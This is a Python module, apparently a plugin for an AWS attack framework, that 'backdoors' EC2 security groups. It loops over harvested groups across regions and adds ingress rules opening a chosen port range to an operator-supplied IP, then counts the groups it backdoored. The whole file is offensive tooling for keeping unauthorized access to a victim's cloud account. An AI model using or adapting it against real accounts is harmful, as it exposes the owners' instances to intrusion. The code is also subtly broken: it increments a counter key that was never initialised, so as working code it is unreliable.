#!/usr/bin/env python3
#'description': ''This module adds rules to backdoor EC2 security groups. It attempts to open ingress port ranges from an IP of your choice.',
import datetime

import argparse
from botocore.exceptions import ClientError

def main(args, awsattack_main, data=None):
    session = awsattack_main.get_active_session()
    print = awsattack_main.print

    summary_data = {}

    client = awsattack_main.get_boto3_client('ec2', 'us-east-1')
    
    groups = data['SecGroups']
    print('Applying Rules...')
    for group in groups:
        print('  Group: {}'.format(group['GroupName']))

        client = awsattack_main.get_boto3_client('ec2', group['Region'])

        try:
            client.authorize_security_group_ingress(
                GroupName=group['GroupName'],
                CidrIp=args.ip,
                FromPort=int(args.port_range.split('-')[0]),
                ToPort=int(args.port_range.split('-')[1]),
                IpProtocol=args.protocol
            )
            print('    SUCCESS')
            summary_data['BackdooredCount'] += 1
        except ClientError as error:
            code = error.response['Error']['Code']
            print('FAILURE: ')
            if code == 'UnauthorizedOperation':
                print('  Access denied to AuthorizeSecurityGroupIngress.')
                break
            elif code == 'InvalidPermission.Duplicate':
                print('      Rule already exists.')
                return None
            else:
                print('  ' + code)
    return summary_data


def summary(data, awsattack_main):
    out = ''
    if 'BackdooredCount' in data:
        out += '  {} security group(s) successfully backdoored.\n'.format(data['BackdooredCount'])
    return out
